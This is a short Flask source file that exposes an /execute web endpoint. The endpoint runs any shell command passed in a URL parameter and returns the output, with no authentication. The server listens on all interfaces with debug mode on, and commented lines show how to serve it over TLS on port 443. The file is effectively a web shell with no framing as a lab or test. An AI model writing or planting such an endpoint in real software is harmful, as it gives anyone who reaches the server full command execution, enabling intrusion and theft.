from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/execute')
def execute_command():
    command = request.args.get('command')
    if command:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout, 200
    else:
        return "No command provided", 400

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
    # In case of TLS encryption
    # ssl_context = ('cert.crt', 'cert.key')
    # app.run(debug=True, host="0.0.0.0", port=443, ssl_context=ssl_context)
